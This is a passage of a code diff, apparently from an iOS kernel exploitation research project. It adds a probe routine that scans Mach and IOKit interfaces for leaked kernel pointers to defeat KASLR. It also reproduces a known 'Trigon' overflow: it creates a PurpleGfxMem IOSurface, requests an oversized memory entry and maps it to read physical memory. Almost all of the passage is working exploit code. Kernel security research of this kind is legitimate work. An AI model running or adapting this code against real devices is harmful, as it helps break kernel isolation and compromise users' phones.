+                    memcpy(&v, (uint8_t *)stat32_buf + j, 8);
+                    if (v > 0xfffffff000000000ULL && v < 0xffffffffffffffffULL) {
+                        rlog("  !!! HOST_STAT32 KPTR flavor=%d off=%zu: 0x%llx !!!\n",
+                             flavor, j, (unsigned long long)v);
+                    }
+                }
+            }
+        }
+
+        mach_port_deallocate(mach_task_self(), host);
+    }
+    fflush(stdout);
+
+    /* ---- Part 2: mach_port_kobject — historical KASLR leak ---- */
+    /* Apple "obfuscates or unslides" the returned address.
+       But if we can figure out the obfuscation scheme, we win.
+       Try multiple port types and see what comes back. */
+    rlog("\n--- Part 2: mach_port_kobject probe ---\n");
+    fflush(stdout);
+    {
+        /* Collect various Mach ports to test */
+        struct { const char *name; mach_port_t port; } ports[20];
+        int nports = 0;
+
+        ports[nports++] = (typeof(ports[0])){"task_self", mach_task_self()};
+        ports[nports++] = (typeof(ports[0])){"host_self", mach_host_self()};
+
+        mach_port_t thread_self = mach_thread_self();
+        ports[nports++] = (typeof(ports[0])){"thread_self", thread_self};
+
+        /* Get bootstrap port */
+        mach_port_t bp;
+        task_get_bootstrap_port(mach_task_self(), &bp);
+        ports[nports++] = (typeof(ports[0])){"bootstrap", bp};
+
+        /* Create some fresh ports */
+        mach_port_t fresh1, fresh2;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fresh1);
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fresh2);
+        ports[nports++] = (typeof(ports[0])){"fresh_recv1", fresh1};
+        ports[nports++] = (typeof(ports[0])){"fresh_recv2", fresh2};
+
+        /* IOSurface port */
+        IOSurfaceCreate_fn cFn = (IOSurfaceCreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        typedef mach_port_t (*IOSurfaceCreateMachPort_fn)(void*);
+        IOSurfaceCreateMachPort_fn mpFn = (IOSurfaceCreateMachPort_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
+        if (cFn && mpFn) {
+            int w = 16, h = 16, bpe = 4, pf = 0x42475241;
+            CFNumberRef wV = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hV = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bV = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef pV = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            const void *ks[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                                CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")};
+            const void *vs2[] = {wV, hV, bV, pV};
+            CFDictionaryRef props = CFDictionaryCreate(NULL, ks, vs2, 4,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            void *surf = cFn(props);
+            if (surf) {
+                mach_port_t sp = mpFn(surf);
+                if (sp != MACH_PORT_NULL) {
+                    ports[nports++] = (typeof(ports[0])){"iosurface_mach", sp};
+                }
+            }
+            CFRelease(props); CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(pV);
+        }
+
+        /* Try mach_port_kobject on each */
+        for (int i = 0; i < nports; i++) {
+            natural_t kotype = 0;
+            mach_vm_address_t kaddr = 0;
+            kern_return_t kr = mach_port_kobject(mach_task_self(),
+                ports[i].port, &kotype, (unsigned int *)&kaddr);
+            rlog("  %s (0x%x): kr=0x%x kotype=%u kaddr=0x%llx\n",
+                 ports[i].name, ports[i].port, kr, kotype, (unsigned long long)kaddr);
+
+            if (kr == 0 && kaddr != 0) {
+                /* Check if it looks like a kernel address */
+                if (kaddr > 0xfffffff000000000ULL) {
+                    rlog("  !!! KOBJECT KERNEL ADDR: %s = 0x%llx (type=%u) !!!\n",
+                         ports[i].name, (unsigned long long)kaddr, kotype);
+                }
+                /* Even if obfuscated, the difference between two addresses may reveal slide */
+                rlog("  KOBJECT RAW: %s = 0x%llx\n", ports[i].name, (unsigned long long)kaddr);
+            }
+        }
+
+        /* Try mach_port_kernel_object (older API) */
+        for (int i = 0; i < nports; i++) {
+            unsigned int kotype = 0;
+            unsigned int kaddr = 0;
+            kern_return_t kr = mach_port_kernel_object(mach_task_self(),
+                ports[i].port, &kotype, &kaddr);
+            if (kr == 0 && kaddr != 0) {
+                rlog("  mach_port_kernel_object %s: type=%u addr=0x%x\n",
+                     ports[i].name, kotype, kaddr);
+            }
+        }
+
+        mach_port_deallocate(mach_task_self(), thread_self);
+        mach_port_destroy(mach_task_self(), fresh1);
+        mach_port_destroy(mach_task_self(), fresh2);
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: processor_set_info / processor_info ---- */
+    rlog("\n--- Part 3: processor_set / processor info probe ---\n");
+    fflush(stdout);
+    {
+        mach_port_t host = mach_host_self();
+
+        /* Get default processor set */
+        mach_port_t pset_default = MACH_PORT_NULL;
+        kern_return_t kr = processor_set_default(host, &pset_default);
+        rlog("  processor_set_default: kr=0x%x port=0x%x\n", kr, pset_default);
+
+        if (kr == 0 && pset_default != MACH_PORT_NULL) {
+            /* Try processor_set_info with various flavors */
+            for (int flavor = 1; flavor <= 10; flavor++) {
+                uint64_t info_buf[64];
+                memset(info_buf, 0xDE, sizeof(info_buf));
+                mach_msg_type_number_t cnt = sizeof(info_buf) / sizeof(integer_t);
+
+                kr = processor_set_info(pset_default, flavor,
+                    &host, (processor_set_info_t)info_buf, &cnt);
+
+                if (kr == 0 && cnt > 0) {
+                    rlog("  processor_set_info flavor=%d: cnt=%u\n", flavor, cnt);
+                    size_t nbytes = cnt * sizeof(integer_t);
+                    for (size_t j = 0; j + 8 <= nbytes; j += 4) {
+                        uint64_t v;
+                        memcpy(&v, (uint8_t *)info_buf + j, 8);
+                        if (v > 0xfffffff000000000ULL && v < 0xffffffffffffffffULL) {
+                            rlog("  !!! PSET_INFO KPTR flavor=%d off=%zu: 0x%llx !!!\n",
+                                 flavor, j, (unsigned long long)v);
+                        }
+                    }
+                    rlog("    raw: ");
+                    for (size_t j = 0; j < nbytes && j < 64; j++) {
+                        rlog("%02x", ((uint8_t *)info_buf)[j]);
+                        if ((j & 7) == 7) rlog(" ");
+                    }
+                    rlog("\n");
+                }
+            }
+            mach_port_deallocate(mach_task_self(), pset_default);
+        }
+
+        /* host_processor_info — per-CPU info may have uninitialized data */
+        for (int flavor = 1; flavor <= 5; flavor++) {
+            natural_t ncpu = 0;
+            processor_info_array_t pinfo = NULL;
+            mach_msg_type_number_t pinfoCnt = 0;
+
+            kr = host_processor_info(host, flavor, &ncpu, &pinfo, &pinfoCnt);
+            if (kr == 0 && pinfo && pinfoCnt > 0) {
+                rlog("  host_processor_info flavor=%d: ncpu=%u cnt=%u\n",
+                     flavor, ncpu, pinfoCnt);
+                /* Scan all returned data for kernel pointers */
+                size_t nbytes = pinfoCnt * sizeof(integer_t);
+                int kptrs = 0;
+                for (size_t j = 0; j + 8 <= nbytes; j += 4) {
+                    uint64_t v;
+                    memcpy(&v, (uint8_t *)pinfo + j, 8);
+                    if (v > 0xfffffff000000000ULL && v < 0xffffffffffffffffULL) {
+                        rlog("  !!! HOST_PROC_INFO KPTR flavor=%d off=%zu: 0x%llx !!!\n",
+                             flavor, j, (unsigned long long)v);
+                        kptrs++;
+                    }
+                }
+                if (kptrs == 0) {
+                    rlog("    no kptrs in %zu bytes\n", nbytes);
+                }
+                vm_deallocate(mach_task_self(), (vm_address_t)pinfo,
+                    pinfoCnt * sizeof(integer_t));
+            }
+        }
+
+        mach_port_deallocate(mach_task_self(), host);
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: PurpleGfxMem IOSurface creation (Trigon pattern) ---- */
+    /* Trigon used IOSurface with IOSurfaceMemoryRegion="PurpleGfxMem" to get
+       a memory entry that could map physical memory. Even if the mapping
+       primitive is blocked on SPTM, the IOSurface creation itself may
+       reveal information through the allocation address or size. */
+    rlog("\n--- Part 4: PurpleGfxMem IOSurface creation ---\n");
+    fflush(stdout);
+    {
+        IOSurfaceCreate_fn cFn2 = (IOSurfaceCreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        IOSurfaceGetID_fn idFn2 = (IOSurfaceGetID_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        typedef void* (*IOSurfaceGetBaseAddress_fn)(void*);
+        typedef size_t (*IOSurfaceGetAllocSize_fn)(void*);
+        IOSurfaceGetBaseAddress_fn baFn = (IOSurfaceGetBaseAddress_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
+        IOSurfaceGetAllocSize_fn asFn = (IOSurfaceGetAllocSize_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetAllocSize");
+        typedef int (*IOSurfaceLock_fn)(void*, uint32_t, uint32_t*);
+        typedef int (*IOSurfaceUnlock_fn)(void*, uint32_t, uint32_t*);
+        IOSurfaceLock_fn lockFn = (IOSurfaceLock_fn)dlsym(RTLD_DEFAULT, "IOSurfaceLock");
+        IOSurfaceUnlock_fn unlockFn = (IOSurfaceUnlock_fn)dlsym(RTLD_DEFAULT, "IOSurfaceUnlock");
+
+        if (cFn2 && baFn && asFn && lockFn && unlockFn) {
+            /* Create a standard IOSurface for comparison */
+            int w = 64, h = 64, bpe = 4, pf = 0x42475241;
+            CFNumberRef wV = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hV = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bV = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef pV = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+
+            /* Standard surface */
+            const void *ks1[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                                CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")};
+            const void *vs1[] = {wV, hV, bV, pV};
+            CFDictionaryRef std_props = CFDictionaryCreate(NULL, ks1, vs1, 4,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            void *std_surf = cFn2(std_props);
+            if (std_surf) {
+                lockFn(std_surf, 0, NULL);
+                void *std_base = baFn(std_surf);
+                size_t std_alloc = asFn(std_surf);
+                unlockFn(std_surf, 0, NULL);
+                rlog("  Standard surface: base=%p alloc=%zu id=%u\n",
+                     std_base, std_alloc, idFn2 ? idFn2(std_surf) : 0);
+            }
+            CFRelease(std_props);
+
+            /* PurpleGfxMem surface — the key Trigon ingredient */
+            const void *ks2[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                                CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat"),
+                                CFSTR("IOSurfaceMemoryRegion")};
+            const void *vs2[] = {wV, hV, bV, pV, CFSTR("PurpleGfxMem")};
+            CFDictionaryRef pgfx_props = CFDictionaryCreate(NULL, ks2, vs2, 5,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            void *pgfx_surf = cFn2(pgfx_props);
+            if (pgfx_surf) {
+                lockFn(pgfx_surf, 0, NULL);
+                void *pgfx_base = baFn(pgfx_surf);
+                size_t pgfx_alloc = asFn(pgfx_surf);
+                unlockFn(pgfx_surf, 0, NULL);
+                rlog("  !!! PurpleGfxMem surface CREATED: base=%p alloc=%zu id=%u !!!\n",
+                     pgfx_base, pgfx_alloc, idFn2 ? idFn2(pgfx_surf) : 0);
+
+                /* Compare base addresses — if PurpleGfxMem is at a very different
+                   address than standard, it may reveal physical memory layout */
+                if (std_surf) {
+                    lockFn(std_surf, 0, NULL);
+                    void *sb = baFn(std_surf);
+                    unlockFn(std_surf, 0, NULL);
+                    ptrdiff_t diff = (uint8_t *)pgfx_base - (uint8_t *)sb;
+                    rlog("  Address diff (PurpleGfxMem - standard): 0x%llx (%lld)\n",
+                         (unsigned long long)diff, (long long)diff);
+                }
+
+                /* Try mach_make_memory_entry_64 on the PurpleGfxMem surface */
+                lockFn(pgfx_surf, 0, NULL);
+                mach_port_t mem_entry = MACH_PORT_NULL;
+                memory_object_size_t entry_size = pgfx_alloc;
+                kern_return_t kr = mach_make_memory_entry_64(mach_task_self(),
+                    &entry_size,
+                    (memory_object_offset_t)(uintptr_t)pgfx_base,
+                    VM_PROT_DEFAULT, &mem_entry, MACH_PORT_NULL);
+                unlockFn(pgfx_surf, 0, NULL);
+                rlog("  mach_make_memory_entry_64 (PurpleGfxMem): kr=0x%x entry=0x%x size=0x%llx\n",
+                     kr, mem_entry, (unsigned long long)entry_size);
+
+                if (kr == 0 && mem_entry != MACH_PORT_NULL) {
+                    /* Try to create an oversized entry (Trigon overflow pattern) */
+                    mach_port_t large_entry = MACH_PORT_NULL;
+                    memory_object_size_t large_size = 0xFFFFFFFFFFFFC000ULL;
+                    kr = mach_make_memory_entry_64(mach_task_self(),
+                        &large_size, 0x8000,
+                        VM_PROT_DEFAULT, &large_entry, mem_entry);
+                    rlog("  Large memory entry (Trigon overflow): kr=0x%x entry=0x%x size=0x%llx\n",
+                         kr, large_entry, (unsigned long long)large_size);
+
+                    if (kr == 0 && large_entry != MACH_PORT_NULL) {
+                        rlog("  !!! TRIGON OVERFLOW ENTRY CREATED — checking mappable range !!!\n");
+                        /* Try to map at various offsets to see if we can read physical memory */
+                        uint64_t test_offsets[] = {0, 0x4000, 0x100000, 0x1000000};
+                        for (int ti = 0; ti < 4; ti++) {
+                            mach_vm_address_t mapped = 0;
+                            kr = mach_vm_map(mach_task_self(), &mapped, 0x4000, 0,
+                                VM_FLAGS_ANYWHERE, large_entry, test_offsets[ti],
+                                0, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
+                            if (kr == 0) {
+                                /* Read first 64 bytes and check for kernel data */
+                                uint64_t *dp = (uint64_t *)mapped;
+                                rlog("  Mapped offset 0x%llx: [0x%llx, 0x%llx, 0x%llx, 0x%llx]\n",
+                                     test_offsets[ti], dp[0], dp[1], dp[2], dp[3]);
+                                /* Check for kernel pointers */
+                                for (int k = 0; k < 512; k++) {
+                                    if (dp[k] > 0xfffffff000000000ULL &&
+                                        dp[k] < 0xffffffffffffffffULL) {
+                                        rlog("  !!! PHYSICAL MEMORY KPTR off=0x%llx+%d: 0x%llx !!!\n",
+                                             test_offsets[ti], k*8, dp[k]);
+                                    }
+                                }
+                                mach_vm_deallocate(mach_task_self(), mapped, 0x4000);
+                            } else {
+                                rlog("  Map offset 0x%llx: kr=0x%x\n", test_offsets[ti], kr);
+                            }
+                        }
+                        mach_port_deallocate(mach_task_self(), large_entry);
+                    }
+                    mach_port_deallocate(mach_task_self(), mem_entry);
+                }
+
+                CFRelease(pgfx_surf);
+            } else {
+                rlog("  PurpleGfxMem surface creation: FAILED (may be blocked on SPTM)\n");
+            }
+
+            if (std_surf) CFRelease(std_surf);
+            CFRelease(pgfx_props);
+            CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(pV);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 5: task_info extended probe ---- */
+    /* Some task_info flavors were added in newer iOS but may not fully
+       sanitize kernel addresses in all fields */
+    rlog("\n--- Part 5: task_info extended probe (flavors 1-50) ---\n");
+    fflush(stdout);
+    {
+        for (int flavor = 1; flavor <= 50; flavor++) {
+            uint64_t info_buf[64];
+            memset(info_buf, 0xDE, sizeof(info_buf));
+            mach_msg_type_number_t cnt = sizeof(info_buf) / sizeof(natural_t);
+
+            kern_return_t kr = task_info(mach_task_self(), flavor,
+                (task_info_t)info_buf, &cnt);
+
+            if (kr == 0 && cnt > 0) {
+                size_t nbytes = cnt * sizeof(natural_t);
+                int kptrs = 0;
+                for (size_t j = 0; j + 8 <= nbytes; j += 4) {
+                    uint64_t v;
+                    memcpy(&v, (uint8_t *)info_buf + j, 8);
+                    if (v > 0xfffffff000000000ULL && v < 0xffffffffffffffffULL) {
+                        rlog("  !!! TASK_INFO KPTR flavor=%d off=%zu: 0x%llx !!!\n",
+                             flavor, j, (unsigned long long)v);
+                        kptrs++;
+                    }
+                }
+                if (kptrs > 0) {
+                    rlog("    raw: ");
+                    for (size_t j = 0; j < nbytes && j < 64; j++) {
+                        rlog("%02x", ((uint8_t *)info_buf)[j]);
+                        if ((j & 7) == 7) rlog(" ");
+                    }
+                    rlog("\n");
+                }
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 6: thread_info extended + mach_zone_info kptr scan ---- */
+    rlog("\n--- Part 6: thread_info (all flavors) + zone info scan ---\n");
+    fflush(stdout);
+    {
+        thread_act_array_t threads = NULL;
+        mach_msg_type_number_t thread_cnt = 0;
+        kern_return_t kr = task_threads(mach_task_self(), &threads, &thread_cnt);
+        if (kr == 0 && thread_cnt > 0) {
+            rlog("  %u threads\n", thread_cnt);
+            /* Check flavors 1-30 on first thread */
+            for (int flavor = 1; flavor <= 30; flavor++) {
+                uint64_t ti_buf[64];
+                memset(ti_buf, 0xDE, sizeof(ti_buf));
+                mach_msg_type_number_t cnt = sizeof(ti_buf) / sizeof(natural_t);
+
+                kr = thread_info(threads[0], flavor,
+                    (thread_info_t)ti_buf, &cnt);
+
+                if (kr == 0 && cnt > 0) {
+                    size_t nbytes = cnt * sizeof(natural_t);
+                    for (size_t j = 0; j + 8 <= nbytes; j += 4) {
+                        uint64_t v;
+                        memcpy(&v, (uint8_t *)ti_buf + j, 8);
+                        if (v > 0xfffffff000000000ULL && v < 0xffffffffffffffffULL) {
+                            rlog("  !!! THREAD_INFO KPTR flavor=%d off=%zu: 0x%llx !!!\n",
+                                 flavor, j, (unsigned long long)v);
+                        }
+                    }
+                }
+            }
+
+            for (mach_msg_type_number_t i = 0; i < thread_cnt; i++) {
+                mach_port_deallocate(mach_task_self(), threads[i]);
+            }
+            vm_deallocate(mach_task_self(), (vm_address_t)threads,
+                thread_cnt * sizeof(thread_act_t));
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r329 complete ===\n");
     fflush(stdout);
 }
 
@@ -40783,6 +41839,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 329) {
+            rlog("*** rounds=329: OOB TIFF Decode + IOSurface Header + Async IOKit ***\n");
+            rlog("  r328: TIFF3 OOB accepted, pre-base readable, no uninit leaks.\n");
+            rlog("  Probe: Force TIFF decode, header hexdump, NV12 planes, async methods, registry.\n\n");
+            r329_probe();
             goto done;
         }
         if (rounds == 328) {
